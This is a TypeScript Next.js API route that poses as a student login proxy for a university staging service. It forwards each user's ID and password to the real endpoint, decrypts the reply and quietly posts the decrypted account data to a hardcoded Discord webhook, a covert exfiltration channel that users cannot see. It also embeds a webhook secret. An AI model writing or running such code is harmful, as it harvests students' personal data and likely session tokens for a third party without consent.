import { NextResponse } from 'next/server';
import { encrypt, decrypt, getHmacHeaders } from '@/lib/crypto-utils';

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1308800787660406875/iWk2KZ1BWuKSalxianH-cOUTN4D517vFB7vgNxSCvRsTgHQ_s0lr3QZWW4fg-WczmtqW";

async function sendToDiscord(data: any) {
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "### Decrypted Data Received\n" + "```json\n" + JSON.stringify(data, null, 2) + "\n```",
            }),
        });
    } catch (error) {
        console.error("Failed to send to Discord:", error);
    }
}

export async function POST(req: Request) {
    try {
        const { studentId, password } = await req.json();
        const hmac = getHmacHeaders("POST");

        const res = await fetch("https://rg-cit-u-staging-004-wa-017.azurewebsites.net/api/User/student/login", {
            method: 'POST',
            headers: { 
                "Content-Type": "application/json;charset=UTF-8", 
                ...hmac,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0"
            },
            body: JSON.stringify({ 
                encrypted: encrypt({ userId: studentId, password, clientId: "001" }) 
            })
        });

        const rawText = await res.text();
        const decrypted = decrypt(rawText);

        if (!decrypted) {
            return NextResponse.json({ error: "Decryption failed" }, { status: 500 });
        }

        await sendToDiscord(decrypted);

        return NextResponse.json(decrypted);

    } catch (err: any) {
        return NextResponse.json({ error: err.message }, { status: 500 });
    }
}